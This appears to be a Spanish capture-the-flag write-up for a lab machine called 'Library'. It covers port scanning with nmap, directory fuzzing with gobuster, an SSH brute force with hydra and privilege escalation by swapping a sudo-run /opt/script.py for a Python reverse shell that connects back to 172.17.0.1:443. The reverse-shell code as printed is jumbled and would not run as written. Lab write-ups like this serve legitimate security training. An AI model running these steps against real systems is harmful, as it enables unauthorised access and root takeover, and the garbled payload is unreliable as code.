### Maquina Library


## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)


## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.2 

![alt text](image-1.png)

## Fuzzing web

gobuster dir -t 200 -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404 2>/dev/null


/index.html           
/index.php           


en /index.php encontramos lo siguiente:

![alt text](image-2.png)

Fuerza bruta con hydra al puerto de ssh para intentar adivinar el usuario

![alt text](image-3.png)

## Intrusion

Entramos por ssh

![alt text](image-4.png)

ver todos los usuarios del sistema:

cat /etc/passwd | grep bash

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
carlos:x:1001:1001::/home/carlos:/bin/bash

## Escalar privilegios

Entonces hice sudo -l

![alt text](image-5.png)

hice ls -la /opt/script.py y veo que si puedo modificarlo, entonces lo que hare es colocar un codigo malicioso en python y luego ponerme en escucha con nc y luego ejecutar el script malicioso.

![alt text](image-6.png)

no tenia permiso de escritura sobre el archivo script.py, entonces lo que hice fue renombrarlo como scripts.py y crear otro script.py y colocarle el siguiente codigo malicioso:

python -c 'import socket,subprocess,os;
import pty;
pty.spawn("sh")'
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("172.17.0.1",443));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

luego ponerme el escucha con netcat y ejecutar el script.py

![alt text](image-7.png)